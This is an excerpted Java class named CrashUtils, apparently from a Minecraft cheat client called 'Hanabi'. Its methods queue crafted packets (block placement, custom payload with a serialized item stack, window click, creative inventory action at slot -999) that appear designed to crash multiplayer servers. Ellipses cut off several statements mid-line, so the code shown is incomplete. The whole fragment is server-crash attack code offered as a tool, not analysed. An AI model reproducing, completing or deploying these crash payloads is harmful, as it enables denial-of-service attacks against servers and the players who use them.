...
public class CrashUtils {
    ...
    public void oneblockcrash(ItemStack stack) {
        Hanabi.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
    ...
    public void payload2(ItemStack stack) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(stack);
        Hanabi.INSTANCE.packetQueue.add(new C17PacketCustomPayload(buffertype[ThreadLocalRandom.current().nextInt(1)], packetBuffer));
    }
    ...
    public void click(ItemStack stack) {
        Hanabi.INSTANCE.packetQueue.add(new C0EPacketClickWindow
    ...
    public void justcreate(ItemStack stack) {
        Hanabi.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction
                (-999, stack));
    }
